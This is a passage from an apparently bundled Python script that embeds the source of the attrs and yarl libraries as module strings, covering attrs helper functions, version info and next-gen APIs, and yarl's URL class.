``attrs`` attribute values of *inst* as a tuple.\n\n    Optionally recurse into other ``attrs``-decorated classes.\n\n    :param inst: Instance of an ``attrs``-decorated class.\n    :param bool recurse: Recurse into classes that are also\n        ``attrs``-decorated.\n    :param callable filter: A callable whose return code determines whether an\n        attribute or element is included (``True``) or dropped (``False``).  Is\n        called with the `attrs.Attribute` as the first argument and the\n        value as the second argument.\n    :param callable tuple_factory: A callable to produce tuples from.  For\n        example, to produce lists instead of tuples.\n    :param bool retain_collection_types: Do not convert to ``list``\n        or ``dict`` when encountering an attribute which type is\n        ``tuple``, ``dict`` or ``set``.  Only meaningful if ``recurse`` is\n        ``True``.\n\n    :rtype: return type of *tuple_factory*\n\n    :raise attr.exceptions.NotAnAttrsClassError: If *cls* is not an ``attrs``\n        class.\n\n    ..  versionadded:: 16.2.0\n    """\n    attrs = fields(inst.__class__)\n    rv = []\n    retain = retain_collection_types  # Very long. :/\n    for a in attrs:\n        v = getattr(inst, a.name)\n        if filter is not None and not filter(a, v):\n            continue\n        if recurse is True:\n            if has(v.__class__):\n                rv.append(\n                    astuple(\n                        v,\n                        recurse=True,\n                        filter=filter,\n                        tuple_factory=tuple_factory,\n                        retain_collection_types=retain,\n                    )\n                )\n            elif isinstance(v, (tuple, list, set, frozenset)):\n                cf = v.__class__ if retain is True else list\n                rv.append(\n                    cf(\n                        [\n                            astuple(\n                                j,\n                                recurse=True,\n                                filter=filter,\n                                tuple_factory=tuple_factory,\n                                retain_collection_types=retain,\n                            )\n                            if has(j.__class__)\n                            else j\n                            for j in v\n                        ]\n                    )\n                )\n            elif isinstance(v, dict):\n                df = v.__class__ if retain is True else dict\n                rv.append(\n                    df(\n                        (\n                            astuple(\n                                kk,\n                                tuple_factory=tuple_factory,\n                                retain_collection_types=retain,\n                            )\n                            if has(kk.__class__)\n                            else kk,\n                            astuple(\n                                vv,\n                                tuple_factory=tuple_factory,\n                                retain_collection_types=retain,\n                            )\n                            if has(vv.__class__)\n                            else vv,\n                        )\n                        for kk, vv in iteritems(v)\n                    )\n                )\n            else:\n                rv.append(v)\n        else:\n            rv.append(v)\n\n    return rv if tuple_factory is list else tuple_factory(rv)\n\n\ndef has(cls):\n    """\n    Check whether *cls* is a class with ``attrs`` attributes.\n\n    :param type cls: Class to introspect.\n    :raise TypeError: If *cls* is not a class.\n\n    :rtype: bool\n    """\n    return getattr(cls, "__attrs_attrs__", None) is not None\n\n\ndef assoc(inst, **changes):\n    """\n    Copy *inst* and apply *changes*.\n\n    :param inst: Instance of a class with ``attrs`` attributes.\n    :param changes: Keyword changes in the new copy.\n\n    :return: A copy of inst with *changes* incorporated.\n\n    :raise attr.exceptions.AttrsAttributeNotFoundError: If *attr_name* couldn\'t\n        be found on *cls*.\n    :raise attr.exceptions.NotAnAttrsClassError: If *cls* is not an ``attrs``\n        class.\n\n    ..  deprecated:: 17.1.0\n        Use `attrs.evolve` instead if you can.\n        This function will not be removed du to the slightly different approach\n        compared to `attrs.evolve`.\n    """\n    import warnings\n\n    warnings.warn(\n        "assoc is deprecated and will be removed after 2018/01.",\n        DeprecationWarning,\n        stacklevel=2,\n    )\n    new = copy.copy(inst)\n    attrs = fields(inst.__class__)\n    for k, v in iteritems(changes):\n        a = getattr(attrs, k, NOTHING)\n        if a is NOTHING:\n            raise AttrsAttributeNotFoundError(\n                "{k} is not an attrs attribute on {cl}.".format(\n                    k=k, cl=new.__class__\n                )\n            )\n        _obj_setattr(new, k, v)\n    return new\n\n\ndef evolve(inst, **changes):\n    """\n    Create a new instance, based on *inst* with *changes* applied.\n\n    :param inst: Instance of a class with ``attrs`` attributes.\n    :param changes: Keyword changes in the new copy.\n\n    :return: A copy of inst with *changes* incorporated.\n\n    :raise TypeError: If *attr_name* couldn\'t be found in the class\n        ``__init__``.\n    :raise attr.exceptions.NotAnAttrsClassError: If *cls* is not an ``attrs``\n        class.\n\n    ..  versionadded:: 17.1.0\n    """\n    cls = inst.__class__\n    attrs = fields(cls)\n    for a in attrs:\n        if not a.init:\n            continue\n        attr_name = a.name  # To deal with private attributes.\n        init_name = attr_name if attr_name[0] != "_" else attr_name[1:]\n        if init_name not in changes:\n            changes[init_name] = getattr(inst, attr_name)\n\n    return cls(**changes)\n\n\ndef resolve_types(cls, globalns=None, localns=None, attribs=None):\n    """\n    Resolve any strings and forward annotations in type annotations.\n\n    This is only required if you need concrete types in `Attribute`\'s *type*\n    field. In other words, you don\'t need to resolve your types if you only\n    use them for static type checking.\n\n    With no arguments, names will be looked up in the module in which the class\n    was created. If this is not what you want, e.g. if the name only exists\n    inside a method, you may pass *globalns* or *localns* to specify other\n    dictionaries in which to look up these names. See the docs of\n    `typing.get_type_hints` for more details.\n\n    :param type cls: Class to resolve.\n    :param Optional[dict] globalns: Dictionary containing global variables.\n    :param Optional[dict] localns: Dictionary containing local variables.\n    :param Optional[list] attribs: List of attribs for the given class.\n        This is necessary when calling from inside a ``field_transformer``\n        since *cls* is not an ``attrs`` class yet.\n\n    :raise TypeError: If *cls* is not a class.\n    :raise attr.exceptions.NotAnAttrsClassError: If *cls* is not an ``attrs``\n        class and you didn\'t pass any attribs.\n    :raise NameError: If types cannot be resolved because of missing variables.\n\n    :returns: *cls* so you can use this function also as a class decorator.\n        Please note that you have to apply it **after** `attrs.define`. That\n        means the decorator has to come in the line **before** `attrs.define`.\n\n    ..  versionadded:: 20.1.0\n    ..  versionadded:: 21.1.0 *attribs*\n\n    """\n    # Since calling get_type_hints is expensive we cache whether we\'ve\n    # done it already.\n    if getattr(cls, "__attrs_types_resolved__", None) != cls:\n        import typing\n\n        hints = typing.get_type_hints(cls, globalns=globalns, localns=localns)\n        for field in fields(cls) if attribs is None else attribs:\n            if field.name in hints:\n                # Since fields have been frozen we must work around it.\n                _obj_setattr(field, "type", hints[field.name])\n        # We store the class we resolved so that subclasses know they haven\'t\n        # been resolved.\n        cls.__attrs_types_resolved__ = cls\n\n    # Return the class so you can use it as a decorator too.\n    return cls\n')
    __stickytape_write_module('attr/_version_info.py', b'# SPDX-License-Identifier: MIT\n\nfrom __future__ import absolute_import, division, print_function\n\nfrom functools import total_ordering\n\nfrom ._funcs import astuple\nfrom ._make import attrib, attrs\n\n\n@total_ordering\n@attrs(eq=False, order=False, slots=True, frozen=True)\nclass VersionInfo(object):\n    """\n    A version object that can be compared to tuple of length 1--4:\n\n    >>> attr.VersionInfo(19, 1, 0, "final")  <= (19, 2)\n    True\n    >>> attr.VersionInfo(19, 1, 0, "final") < (19, 1, 1)\n    True\n    >>> vi = attr.VersionInfo(19, 2, 0, "final")\n    >>> vi < (19, 1, 1)\n    False\n    >>> vi < (19,)\n    False\n    >>> vi == (19, 2,)\n    True\n    >>> vi == (19, 2, 1)\n    False\n\n    .. versionadded:: 19.2\n    """\n\n    year = attrib(type=int)\n    minor = attrib(type=int)\n    micro = attrib(type=int)\n    releaselevel = attrib(type=str)\n\n    @classmethod\n    def _from_version_string(cls, s):\n        """\n        Parse *s* and return a _VersionInfo.\n        """\n        v = s.split(".")\n        if len(v) == 3:\n            v.append("final")\n\n        return cls(\n            year=int(v[0]), minor=int(v[1]), micro=int(v[2]), releaselevel=v[3]\n        )\n\n    def _ensure_tuple(self, other):\n        """\n        Ensure *other* is a tuple of a valid length.\n\n        Returns a possibly transformed *other* and ourselves as a tuple of\n        the same length as *other*.\n        """\n\n        if self.__class__ is other.__class__:\n            other = astuple(other)\n\n        if not isinstance(other, tuple):\n            raise NotImplementedError\n\n        if not (1 <= len(other) <= 4):\n            raise NotImplementedError\n\n        return astuple(self)[: len(other)], other\n\n    def __eq__(self, other):\n        try:\n            us, them = self._ensure_tuple(other)\n        except NotImplementedError:\n            return NotImplemented\n\n        return us == them\n\n    def __lt__(self, other):\n        try:\n            us, them = self._ensure_tuple(other)\n        except NotImplementedError:\n            return NotImplemented\n\n        # Since alphabetically "dev0" < "final" < "post1" < "post2", we don\'t\n        # have to do anything special with releaselevel for now.\n        return us < them\n')
    __stickytape_write_module('attr/_next_gen.py', b'# SPDX-License-Identifier: MIT\n\n"""\nThese are Python 3.6+-only and keyword-only APIs that call `attr.s` and\n`attr.ib` with different default values.\n"""\n\n\nfrom functools import partial\n\nfrom . import setters\nfrom ._funcs import asdict as _asdict\nfrom ._funcs import astuple as _astuple\nfrom ._make import (\n    NOTHING,\n    _frozen_setattrs,\n    _ng_default_on_setattr,\n    attrib,\n    attrs,\n)\nfrom .exceptions import UnannotatedAttributeError\n\n\ndef define(\n    maybe_cls=None,\n    *,\n    these=None,\n    repr=None,\n    hash=None,\n    init=None,\n    slots=True,\n    frozen=False,\n    weakref_slot=True,\n    str=False,\n    auto_attribs=None,\n    kw_only=False,\n    cache_hash=False,\n    auto_exc=True,\n    eq=None,\n    order=False,\n    auto_detect=True,\n    getstate_setstate=None,\n    on_setattr=None,\n    field_transformer=None,\n    match_args=True,\n):\n    r"""\n    Define an ``attrs`` class.\n\n    Differences to the classic `attr.s` that it uses underneath:\n\n    - Automatically detect whether or not *auto_attribs* should be `True`\n      (c.f. *auto_attribs* parameter).\n    - If *frozen* is `False`, run converters and validators when setting an\n      attribute by default.\n    - *slots=True* (see :term:`slotted classes` for potentially surprising\n      behaviors)\n    - *auto_exc=True*\n    - *auto_detect=True*\n    - *order=False*\n    - *match_args=True*\n    - Some options that were only relevant on Python 2 or were kept around for\n      backwards-compatibility have been removed.\n\n    Please note that these are all defaults and you can change them as you\n    wish.\n\n    :param Optional[bool] auto_attribs: If set to `True` or `False`, it behaves\n       exactly like `attr.s`. If left `None`, `attr.s` will try to guess:\n\n       1. If any attributes are annotated and no unannotated `attrs.fields`\\ s\n          are found, it assumes *auto_attribs=True*.\n       2. Otherwise it assumes *auto_attribs=False* and tries to collect\n          `attrs.fields`\\ s.\n\n    For now, please refer to `attr.s` for the rest of the parameters.\n\n    .. versionadded:: 20.1.0\n    .. versionchanged:: 21.3.0 Converters are also run ``on_setattr``.\n    """\n\n    def do_it(cls, auto_attribs):\n        return attrs(\n            maybe_cls=cls,\n            these=these,\n            repr=repr,\n            hash=hash,\n            init=init,\n            slots=slots,\n            frozen=frozen,\n            weakref_slot=weakref_slot,\n            str=str,\n            auto_attribs=auto_attribs,\n            kw_only=kw_only,\n            cache_hash=cache_hash,\n            auto_exc=auto_exc,\n            eq=eq,\n            order=order,\n            auto_detect=auto_detect,\n            collect_by_mro=True,\n            getstate_setstate=getstate_setstate,\n            on_setattr=on_setattr,\n            field_transformer=field_transformer,\n            match_args=match_args,\n        )\n\n    def wrap(cls):\n        """\n        Making this a wrapper ensures this code runs during class creation.\n\n        We also ensure that frozen-ness of classes is inherited.\n        """\n        nonlocal frozen, on_setattr\n\n        had_on_setattr = on_setattr not in (None, setters.NO_OP)\n\n        # By default, mutable classes convert & validate on setattr.\n        if frozen is False and on_setattr is None:\n            on_setattr = _ng_default_on_setattr\n\n        # However, if we subclass a frozen class, we inherit the immutability\n        # and disable on_setattr.\n        for base_cls in cls.__bases__:\n            if base_cls.__setattr__ is _frozen_setattrs:\n                if had_on_setattr:\n                    raise ValueError(\n                        "Frozen classes can\'t use on_setattr "\n                        "(frozen-ness was inherited)."\n                    )\n\n                on_setattr = setters.NO_OP\n                break\n\n        if auto_attribs is not None:\n            return do_it(cls, auto_attribs)\n\n        try:\n            return do_it(cls, True)\n        except UnannotatedAttributeError:\n            return do_it(cls, False)\n\n    # maybe_cls\'s type depends on the usage of the decorator.  It\'s a class\n    # if it\'s used as `@attrs` but ``None`` if used as `@attrs()`.\n    if maybe_cls is None:\n        return wrap\n    else:\n        return wrap(maybe_cls)\n\n\nmutable = define\nfrozen = partial(define, frozen=True, on_setattr=None)\n\n\ndef field(\n    *,\n    default=NOTHING,\n    validator=None,\n    repr=True,\n    hash=None,\n    init=True,\n    metadata=None,\n    converter=None,\n    factory=None,\n    kw_only=False,\n    eq=None,\n    order=None,\n    on_setattr=None,\n):\n    """\n    Identical to `attr.ib`, except keyword-only and with some arguments\n    removed.\n\n    .. versionadded:: 20.1.0\n    """\n    return attrib(\n        default=default,\n        validator=validator,\n        repr=repr,\n        hash=hash,\n        init=init,\n        metadata=metadata,\n        converter=converter,\n        factory=factory,\n        kw_only=kw_only,\n        eq=eq,\n        order=order,\n        on_setattr=on_setattr,\n    )\n\n\ndef asdict(inst, *, recurse=True, filter=None, value_serializer=None):\n    """\n    Same as `attr.asdict`, except that collections types are always retained\n    and dict is always used as *dict_factory*.\n\n    .. versionadded:: 21.3.0\n    """\n    return _asdict(\n        inst=inst,\n        recurse=recurse,\n        filter=filter,\n        value_serializer=value_serializer,\n        retain_collection_types=True,\n    )\n\n\ndef astuple(inst, *, recurse=True, filter=None):\n    """\n    Same as `attr.astuple`, except that collections types are always retained\n    and `tuple` is always used as the *tuple_factory*.\n\n    .. versionadded:: 21.3.0\n    """\n    return _astuple(\n        inst=inst, recurse=recurse, filter=filter, retain_collection_types=True\n    )\n')
    __stickytape_write_module('yarl/__init__.py', b'from ._url import URL, cache_clear, cache_configure, cache_info\r\n\r\n__version__ = "1.7.2"\r\n\r\n__all__ = ("URL", "cache_clear", "cache_configure", "cache_info")\r\n')
    __stickytape_write_module('yarl/_url.py', b'import functools\r\nimport sys\r\nimport warnings\r\nfrom collections.abc import Mapping, Sequence\r\nfrom ipaddress import ip_address\r\nfrom urllib.parse import SplitResult, parse_qsl, urljoin, urlsplit, urlunsplit, quote\r\n\r\nfrom multidict import MultiDict, MultiDictProxy\r\nimport idna\r\n\r\nimport math\r\n\r\n\r\nfrom ._quoting import _Quoter, _Unquoter\r\n\r\n\r\nDEFAULT_PORTS = {"http": 80, "https": 443, "ws": 80, "wss": 443}\r\n\r\nsentinel = object()\r\n\r\n\r\ndef rewrite_module(obj: object) -> object:\r\n    obj.__module__ = "yarl"\r\n    return obj\r\n\r\n\r\nclass cached_property:\r\n    """Use as a class method decorator.  It operates almost exactly like\r\n    the Python `@property` decorator, but it puts the result of the\r\n    method it decorates into the instance dict after the first call,\r\n    effectively replacing the function it decorates with an instance\r\n    variable.  It is, in Python parlance, a data descriptor.\r\n\r\n    """\r\n\r\n    def __init__(self, wrapped):\r\n        self.wrapped = wrapped\r\n        try:\r\n            self.__doc__ = wrapped.__doc__\r\n        except AttributeError:  # pragma: no cover\r\n            self.__doc__ = ""\r\n        self.name = wrapped.__name__\r\n\r\n    def __get__(self, inst, owner, _sentinel=sentinel):\r\n        if inst is None:\r\n            return self\r\n        val = inst._cache.get(self.name, _sentinel)\r\n        if val is not _sentinel:\r\n            return val\r\n        val = self.wrapped(inst)\r\n        inst._cache[self.name] = val\r\n        return val\r\n\r\n    def __set__(self, inst, value):\r\n        raise AttributeError("cached property is read-only")\r\n\r\n\r\n@rewrite_module\r\nclass URL:\r\n    # Don\'t derive from str\r\n    # follow pathlib.Path design\r\n    # probably URL will not suffer from pathlib problems:\r\n    # it\'s intended for libraries like aiohttp,\r\n    # not to be passed into standard library functions like os.open etc.\r\n\r\n    # URL grammar (RFC 3986)\r\n    # pct-encoded = "%" HEXDIG HEXDIG\r\n    # reserved    = gen-delims / sub-delims\r\n    # gen-delims  = ":" / "/" / "?" / "#" / "[" / "]" / "@"\r\n    # sub-delims  = "!" / "$" / "&" / "\'" / "(" / ")"\r\n    #             / "*" / "+" / "," / ";" / "="\r\n    # unreserved  = ALPHA / DIGIT / "-" / "." / "_" / "~"\r\n    # URI         = scheme ":" hier-part [ "?" query ] [ "#" fragment ]\r\n    # hier-part   = "//" authority path-abempty\r\n    #             / path-absolute\r\n    #             / path-rootless\r\n    #             / path-empty\r\n    # scheme      = ALPHA *( ALPHA / DIGIT / "+" / "-" / "." )\r\n    # authority   = [ userinfo "@" ] host [ ":" port ]\r\n    # userinfo    = *( unreserved / pct-encoded / sub-delims / ":" )\r\n    # host        = IP-literal / IPv4address / reg-name\r\n    # IP-literal = "[" ( IPv6address / IPvFuture  ) "]"\r\n    # IPvFuture  = "v" 1*HEXDIG "." 1*( unreserved / sub-delims / ":" )\r\n    # IPv6address =                            6( h16 ":" ) ls32\r\n    #             /                       "::" 5( h16 ":" ) ls32\r\n    #             / [               h16 ] "::" 4( h16 ":" ) ls32\r\n    #             / [ *1( h16 ":" ) h16 ] "::" 3( h16 ":" ) ls32\r\n    #             / [ *2( h16 ":" ) h16 ] "::" 2( h16 ":" ) ls32\r\n    #             / [ *3( h16 ":" ) h16 ] "::"    h16 ":"   ls32\r\n    #             / [ *4( h16 ":" ) h16 ] "::"              ls32\r\n    #             / [ *5( h16 ":" ) h16 ] "::"              h16\r\n    #             / [ *6( h16 ":" ) h16 ] "::"\r\n    # ls32        = ( h16 ":" h16 ) / IPv4address\r\n    #             ; least-significant 32 bits of address\r\n    # h16         = 1*4HEXDIG\r\n    #             ; 16 bits of address represented in hexadecimal\r\n    # IPv4address = dec-octet "." dec-octet "." dec-octet "." dec-octet\r\n    # dec-octet   = DIGIT                 ; 0-9\r\n    #             / %x31-39 DIGIT         ; 10-99\r\n    #             / "1" 2DIGIT            ; 100-199\r\n    #             / "2" %x30-34 DIGIT     ; 200-249\r\n    #             / "25" %x30-35          ; 250-255\r\n    # reg-name    = *( unreserved / pct-encoded / sub-delims )\r\n    # port        = *DIGIT\r\n    # path          = path-abempty    ; begins with "/" or is empty\r\n    #               / path-absolute   ; begins with "/" but not "//"\r\n    #               / path-noscheme   ; begins with a non-colon segment\r\n    #               / path-rootless   ; begins with a segment\r\n    #               / path-empty      ; zero characters\r\n    # path-abempty  = *( "/" segment )\r\n    # path-absolute = "/" [ segment-nz *( "/" segment ) ]\r\n    # path-noscheme = segment-nz-nc *( "/" segment )\r\n    # path-rootless = segment-nz *( "/" segment )\r\n    # path-empty    = 0<pchar>\r\n    # segment       = *pchar\r\n    # segment-nz    = 1*pchar\r\n    # segment-nz-nc = 1*( unreserved / pct-encoded / sub-delims / "@" )\r\n    #               ; non-zero-length segment without any colon ":"\r\n    # pchar         = unreserved / pct-encoded / sub-delims / ":" / "@"\r\n    # query       = *( pchar / "/" / "?" )\r\n    # fragment    = *( pchar / "/" / "?" )\r\n    # URI-reference = URI / relative-ref\r\n    # relative-ref  = relative-part [ "?" query ] [ "#" fragment ]\r\n    # relative-part = "//" authority path-abempty\r\n    #               / path-absolute\r\n    #               / path-noscheme\r\n    #               / path-empty\r\n    # absolute-URI  = scheme ":" hier-part [ "?" query ]\r\n    __slots__ = ("_cache", "_val")\r\n\r\n    _QUOTER = _Quoter(requote=False)\r\n    _REQUOTER = _Quoter()\r\n    _PATH_QUOTER = _Quoter(safe="@:", protected="/+", requote=False)\r\n    _PATH_REQUOTER = _Quoter(safe="@:", protected="/+")\r\n    _QUERY_QUOTER = _Quoter(safe="?/:@", protected="=+&;", qs=True, requote=False)\r\n    _QUERY_REQUOTER = _Quoter(safe="?/:@", protected="=+&;", qs=True)\r\n    _QUERY_PART_QUOTER = _Quoter(safe="?/:@", qs=True, requote=False)\r\n    _FRAGMENT_QUOTER = _Quoter(safe="?/:@", requote=False)\r\n    _FRAGMENT_REQUOTER = _Quoter(safe="?/:@")\r\n\r\n    _UNQUOTER = _Unquoter()\r\n    _PATH_UNQUOTER = _Unquoter(unsafe="+")\r\n    _QS_UNQUOTER = _Unquoter(qs=True)\r\n\r\n    def __new__(cls, val="", *, encoded=False, strict=None):\r\n        if strict is not None:  # pragma: no cover\r\n            warnings.warn("strict parameter is ignored")\r\n        if type(val) is cls:\r\n            return val\r\n        if type(val) is str:\r\n            val = urlsplit(val)\r\n        elif type(val) is SplitResult:\r\n            if not encoded:\r\n                raise ValueError("Cannot apply decoding to SplitResult")\r\n        elif isinstance(val, str):\r\n            val = urlsplit(str(val))\r\n        else:\r\n            raise TypeError("Constructor parameter should be str")\r\n\r\n        if not encoded:\r\n            if not val[1]:  # netloc\r\n                netloc = ""\r\n                host = ""\r\n            else:\r\n                host = val.hostname\r\n                if host is None:\r\n                    raise ValueError("Invalid URL: host is required for absolute urls")\r\n\r\n                try:\r\n                    port = val.port\r\n                except ValueError as e:\r\n                    raise ValueError(\r\n                        "Invalid URL: port can\'t be converted to integer"\r\n                    ) from e\r\n\r\n                netloc = cls._make_netloc(\r\n                    val.username, val.password, host, port, encode=True, requote=True\r\n                )\r\n            path = cls._PATH_REQUOTER(val[2])\r\n            if netloc:\r\n                path = cls._normalize_path(path)\r\n\r\n            cls._validate_authority_uri_abs_path(host=host, path=path)\r\n            query = cls._QUERY_REQUOTER(val[3])\r\n            fragment = cls._FRAGMENT_REQUOTER(val[4])\r\n            val = SplitResult(val[0], netloc, path, query, fragment)\r\n\r\n        self = object.__new__(cls)\r\n        self._val = val\r\n        self._cache = {}\r\n        return self\r\n\r\n    @classmethod\r\n    def build(\r\n        cls,\r\n        *,\r\n        scheme="",\r\n        authority="",\r\n        user=None,\r\n        password=None,\r\n        host="",\r\n        port=None,\r\n        path="",\r\n        query=None,\r\n        query_string="",\r\n        fragment="",\r\n        encoded=False\r\n    ):\r\n        """Creates and returns a new URL"""\r\n\r\n        if authority and (user or password or host or port):\r\n            raise ValueError(\r\n                \'Can\\\'t mix "authority" with "user", "password", "host" or "port".\'\r\n            )\r\n        if port and not host:\r\n            raise ValueError(\'Can\\\'t build URL with "port" but without "host".\')\r\n        if query and query_string:\r\n            raise ValueError(\'Only one of "query" or "query_string" should be passed\')\r\n        if (\r\n            scheme is None\r\n            or authority is None\r\n            or path is None\r\n            or query_string is None\r\n            or fragment is None\r\n        ):\r\n            raise TypeError(\r\n                \'NoneType is illegal for "scheme", "authority", "path", \'\r\n                \'"query_string", and "fragment" args, use empty string instead.\'\r\n            )\r\n\r\n        if authority:\r\n            if encoded:\r\n                netloc = authority\r\n            else:\r\n                tmp = SplitResult("", authority, "", "", "")\r\n                netloc = cls._make_netloc(\r\n                    tmp.username, tmp.password, tmp.hostname, tmp.port, encode=True\r\n                )\r\n        elif not user and not password and not host and not port:\r\n            netloc = ""\r\n        else:\r\n            netloc = cls._make_netloc(\r\n                user, password, host, port, encode=not encoded, encode_host=not encoded\r\n            )\r\n        if not encoded:\r\n            path = cls._PATH_QUOTER(path)\r\n            if netloc:\r\n                path = cls._normalize_path(path)\r\n\r\n            cls._validate_authority_uri_abs_path(host=host, path=path)\r\n            query_string = cls._QUERY_QUOTER(query_string)\r\n            fragment = cls._FRAGMENT_QUOTER(fragment)\r\n\r\n        url = cls(\r\n            SplitResult(scheme, netloc, path, query_string, fragment), encoded=True\r\n        )\r\n\r\n        if query:\r\n            return url.with_query(query)\r\n        else:\r\n            return url\r\n\r\n    def __init_subclass__(cls):\r\n        raise TypeError("Inheriting a class {!r} from URL is forbidden".format(cls))\r\n\r\n    def __str__(self):\r\n        val = self._val\r\n        if not val.path and self.is_absolute() and (val.query or val.fragment):\r\n            val = val._replace(path="/")\r\n        return urlunsplit(val)\r\n\r\n    def __repr__(self):\r\n        return "{}(\'{}\')".format(self.__class__.__name__, str(self))\r\n\r\n    def __bytes__(self):\r\n        return str(self).encode("ascii")\r\n\r\n    def __eq__(self, other):\r\n        if not type(other) is URL:\r\n            return NotImplemented\r\n\r\n        val1 = self._val\r\n        if not val1.path and self.is_absolute():\r\n            val1 = val1._replace(path="/")\r\n\r\n        val2 = other._val\r\n        if not val2.path and other.is_absolute():\r\n            val2 = val2._replace(path="/")\r\n\r\n        return val1 == val2\r\n\r\n    def __hash__(self):\r\n        ret = self._cache.get("hash")\r\n        if ret is None:\r\n            val = self._val\r\n            if not val.path and self.is_absolute():\r\n                val = val._replace(path="/")\r\n            ret = self._cache["hash"] = hash(val)\r\n        return ret\r\n\r\n    def __le__(self, other):\r\n        if not type(other) is URL:\r\n            return NotImplemented\r\n        return self._val <= other._val\r\n\r\n    def __lt__(self, other):\r\n        if not type(other) is URL:\r\n            return NotImplemented\r\n        return self._val < other._val\r\n\r\n    def __ge__(self, other):\r\n        if not type(other) is URL:\r\n            return NotImplemented\r\n        return self._val >= other._val\r\n\r\n    def __gt__(self, other):\r\n        if not type(other) is URL:\r\n            return NotImplemented\r\n        return self._val > other._val\r\n\r\n    def __truediv__(self, name):\r\n        name = self._PATH_QUOTER(name)\r\n        if name.startswith("/"):\r\n            raise ValueError(\r\n                "Appending path {!r} starting from slash is forbidden".format(name)\r\n            )\r\n        path = self._val.path\r\n        if path == "/":\r\n            new_path = "/" + name\r\n        elif not path and not self.is_absolute():\r\n            new_path = name\r\n        else:\r\n            parts = path.rstrip("/").split("/")\r\n            parts.append(name)\r\n            new_path = "/".join(parts)\r\n        if self.is_absolute():\r\n            new_path = self._normalize_path(new_path)\r\n        return URL(\r\n            self._val._replace(path=new_path, query="", fragment=""), encoded=True\r\n        )\r\n\r\n    def __mod__(self, query):\r\n        return self.update_query(query)\r\n\r\n    def __bool__(self) -> bool:\r\n        return bool(\r\n            self._val.netloc or self._val.path or self._val.query or self._val.fragment\r\n        )\r\n\r\n    def __getstate__(self):\r\n        return (self._val,)\r\n\r\n    def __setstate__(self, state):\r\n        if state[0] is None and isinstance(state[1], dict):\r\n            # default style pickle\r\n            self._val = state[1]["_val"]\r\n        else:\r\n            self._val, *unused = state\r\n        self._cache = {}\r\n\r\n    def is_absolute(self):\r\n        """A check for absolute URLs.\r\n\r\n        Return True for absolute ones (having scheme or starting\r\n        with //), False otherwise.\r\n\r\n        """\r\n        return self.raw_host is not None\r\n\r\n    def is_default_port(self):\r\n        """A check for default port.\r\n\r\n        Return True if port is default for specified scheme,\r\n        e.g. \'http://python.org\' or \'http://python.org:80\', False\r\n        otherwise.\r\n\r\n        """\r\n        if self.port is None:\r\n            return False\r\n        default = DEFAULT_PORTS.get(self.scheme)\r\n        if default is None:\r\n            return False\r\n        return self.port == default\r\n\r\n    def origin(self):\r\n        """Return an URL with scheme, host and port parts only.\r\n\r\n        user, password, path, query and fragment are removed.\r\n\r\n        """\r\n        # TODO: add a keyword-only option for keeping user/pass maybe?\r\n        if not self.is_absolute():\r\n            raise ValueError("URL should be absolute")\r\n        if not self._val.scheme:\r\n            raise ValueError("URL should have scheme")\r\n        v = self._val\r\n        netloc = self._make_netloc(None, None, v.hostname, v.port)\r\n        val = v._replace(netloc=netloc, path="", query="", fragment="")\r\n        return URL(val, encoded=True)\r\n\r\n    def relative(self):\r\n        """Return a relative part of the URL.\r\n\r\n        scheme, user, password, host and port are removed.\r\n\r\n        """\r\n        if not self.is_absolute():\r\n            raise ValueError("URL should be absolute")\r\n        val = self._val._replace(scheme="", netloc="")\r\n        return URL(val, encoded=True)\r\n\r\n    @property\r\n    def scheme(self):\r\n        """Scheme for absolute URLs.\r\n\r\n        Empty string for relative URLs or URLs starting with //\r\n\r\n        """\r\n        return self._val.scheme\r\n\r\n    @property\r\n    def raw_authority(self):\r\n        """Encoded authority part of URL.\r\n\r\n        Empty string for relative URLs.\r\n\r\n        """\r\n        return self._val.netloc\r\n\r\n    @cached_property\r\n    def authority(self):\r\n        """Decoded authority part of URL.\r\n\r\n        Empty string for relative URLs.\r\n\r\n        """\r\n        return self._make_netloc(\r\n            self.user, self.password, self.host, self.port, encode_host=False\r\n        )\r\n\r\n    @property\r\n    def raw_user(self):\r\n        """Encoded user part of URL.\r\n\r\n        None if user is missing.\r\n\r\n        """\r\n        # not .username\r\n        ret = self._val.username\r\n        if not ret:\r\n            return None\r\n        return ret\r\n\r\n    @cached_property\r\n    def user(self):\r\n        """Decoded user part of URL.\r\n\r\n        None if user is missing.\r\n\r\n        """\r\n        return self._UNQUOTER(self.raw_user)\r\n\r\n    @property\r\n    def raw_password(self):\r\n        """Encoded password part of URL.\r\n\r\n        None if password is missing.\r\n\r\n        """\r\n        return self._val.password\r\n\r\n    @cached_property\r\n    def password(self):\r\n        """Decoded password part of URL.\r\n\r\n        None if password is missing.\r\n\r\n        """\r\n        return self._UNQUOTER(self.raw_password)\r\n\r\n    @property\r\n    def raw_host(self):\r\n        """Encoded host part of URL.\r\n\r\n        None for relative URLs.\r\n\r\n        """\r\n        # Use host instead of hostname for sake of shortness\r\n        # May add .hostname prop later\r\n        return self._val.hostname\r\n\r\n    @cached_property\r\n    def host(self):\r\n        """Decoded host part of URL.\r\n\r\n        None for relative URLs.\r\n\r\n        """\r\n        raw = self.raw_host\r\n        if raw is None:\r\n            return None\r\n        if "%" in raw:\r\n            # Hack for scoped IPv6 addresses like\r\n            # fe80::2%\xd0\x9f\xd1\x80\xd0\xbe\xd0\xb2\xd0\xb5\xd1\x80\xd0\xba\xd0\xb0\r\n            # presence of \'%\' sign means only IPv6 address, so idna is useless.\r\n            return raw\r\n        return _idna_decode(raw)\r\n\r\n    @property\r\n    def port(self):\r\n        """Port part of URL, with scheme-based fallback.\r\n\r\n        None for relative URLs or URLs without explicit port and\r\n        scheme without default port substitution.\r\n\r\n        """\r\n        return self._val.port or DEFAULT_PORTS.get(self._val.scheme)\r\n\r\n    @property\r\n    def explicit_port(self):\r\n        """Port part of URL, without scheme-based fallback.\r\n\r\n        None for relative URLs or URLs without explicit port.\r\n\r\n        """\r\n        return self._val.port\r\n\r\n    @property\r\n    def raw_path(self):\r\n        """Encoded path of URL.\r\n\r\n        / for absolute URLs without path part.\r\n\r\n        """\r\n        ret = self._val.path\r\n        if not ret and self.is_absolute():\r\n            ret = "/"\r\n        return ret\r\n\r\n    @cached_property\r\n    def path(self):\r\n        """Decoded path of URL.\r\n\r\n        / for absolute URLs without path part.\r\n\r\n        """\r\n        return self._PATH_UNQUOTER(self.raw_path)\r\n\r\n    @cached_property\r\n    def query(self):\r\n        """A MultiDictProxy representing parsed query parameters in decoded\r\n        representation.\r\n\r\n        Empty value if URL has no query part.\r\n\r\n        """\r\n        ret = MultiDict(parse_qsl(self.raw_query_string, keep_blank_values=True))\r\n        return MultiDictProxy(ret)\r\n\r\n    @property\r\n    def raw_query_string(self):\r\n        """Encoded query part of 